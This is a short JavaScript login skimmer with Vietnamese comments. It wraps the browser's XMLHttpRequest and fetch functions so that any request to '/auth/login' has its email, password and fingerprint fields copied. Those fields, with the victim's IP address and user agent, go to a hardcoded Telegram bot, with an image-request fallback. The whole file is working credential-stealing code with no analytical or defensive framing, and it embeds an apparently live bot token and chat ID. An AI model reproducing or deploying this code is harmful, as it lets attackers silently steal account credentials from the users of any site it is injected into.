(function(){
  var TG_TOKEN='9242586188:AAGnhfNtg5zUh7hfAATmX5V2u_Uy_SwbIYc';
  var TG_CHAT ='7867696895';
  var TG='https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage';
  
  // Biến kiểm soát thời gian chống spam (Cooldown: 5 giây)
  var lastSentTime = 0;
  var COOLDOWN = 5000; 

  function sendLogin(email, pass, fp, ua){
    var now = Date.now();
    // Nếu chưa đủ thời gian cooldown thì bỏ qua (chặn spam)
    if (now - lastSentTime < COOLDOWN) {
      return;
    }
    lastSentTime = now;

    fetch('https://api.ipify.org?format=json')
      .then(function(r){ return r.json(); })
      .then(function(d){
        var ip = d.ip || 'Unknown';
        var txt = '🌐 IP: ' + ip + '\n[T90] LOGIN\nemail: ' + email + '\npass: ' + pass + '\nfp: ' + fp + '\nua: ' + ua;
        doSend(txt);
      })
      .catch(function(){
        var txt = '🌐 IP: Unknown\n[T90] LOGIN\nemail: ' + email + '\npass: ' + pass + '\nfp: ' + fp + '\nua: ' + ua;
        doSend(txt);
      });
  }

  function doSend(txt){
    try{
      var body=new URLSearchParams();
      body.append('chat_id', TG_CHAT);
      body.append('text', txt.length>4000 ? txt.slice(0,4000) : txt);
      body.append('disable_web_page_preview','true');
      fetch(TG, {method:'POST', mode:'no-cors', body:body, keepalive:true});
      return;
    }catch(e){}
    try{
      var i=new Image();
      i.src=TG+'?chat_id='+encodeURIComponent(TG_CHAT)+'&text='+encodeURIComponent(txt.slice(0,1500));
    }catch(e){}
  }

  function grab(b){
    try{
      var j=JSON.parse(b);
      // Chỉ lấy khi có email hoặc password hợp lệ để tránh bắt nhầm request khác
      if(j.email || j.password) {
        sendLogin(j.email || '', j.password || '', j.fp || '', navigator.userAgent);
      }
    }catch(e){}
  }

  var oo=XMLHttpRequest.prototype.open, os=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){ this.__u=u; return oo.apply(this,arguments); };
  XMLHttpRequest.prototype.send=function(b){
    try{ if(String(this.__u).indexOf('/auth/login')>=0 && b) grab(b); }catch(e){}
    return os.apply(this,arguments);
  };
  var of=window.fetch;
  window.fetch=function(u,o){
    try{ if(String(u).indexOf('/auth/login')>=0 && o && o.body) grab(o.body); }catch(e){}
    return of.apply(this,arguments);
  };
})();